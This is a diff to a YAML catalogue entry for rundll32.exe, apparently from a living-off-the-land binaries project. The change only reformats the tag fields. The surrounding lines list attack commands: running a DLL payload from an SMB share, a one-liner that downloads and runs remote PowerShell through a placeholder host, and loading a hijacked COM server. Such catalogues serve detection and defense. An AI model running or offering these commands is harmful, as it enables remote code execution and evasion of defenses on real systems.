@@ -11,7 +11,8 @@ Commands:
     Privileges: User
     MitreID: T1218.011
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-    Tags: ['DLL']
+    Tags:
+      - Execute: DLL
   - Command: rundll32.exe \\10.10.10.10\share\payload.dll,EntryPoint
     Description: Use Rundll32.exe to execute a DLL from a SMB share. EntryPoint is the name of the entry point in the .DLL file to execute.
     Usecase: Execute DLL from SMB share.
@@ -19,7 +20,8 @@ Commands:
     Privileges: User
     MitreID: T1218.011
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-    Tags: ['DLL']
+    Tags:
+      - Execute: DLL
   - Command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');")
     Description: Use Rundll32.exe to execute a JavaScript script that runs a PowerShell script that is downloaded from a remote web site.
     Usecase: Execute code from Internet
@@ -55,7 +57,8 @@ Commands:
     Privileges: User
     MitreID: T1564.004
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-    Tags: ['DLL']
+    Tags:
+      - Execute: DLL
   - Command: rundll32.exe -sta {CLSID}
     Description: Use Rundll32.exe to load a registered or hijacked COM Server payload. Also works with ProgID.
     Usecase: Execute a DLL/EXE COM server payload or ScriptletURL code.
@@ -63,7 +66,8 @@ Commands:
     Privileges: User
     MitreID: T1218.011
     OperatingSystem: Windows 10 (and likely previous versions), Windows 11
-    Tags: ['DLL']
+    Tags:
+      - Execute: DLL
 Full_Path:
   - Path: C:\Windows\System32\rundll32.exe
   - Path: C:\Windows\SysWOW64\rundll32.exe
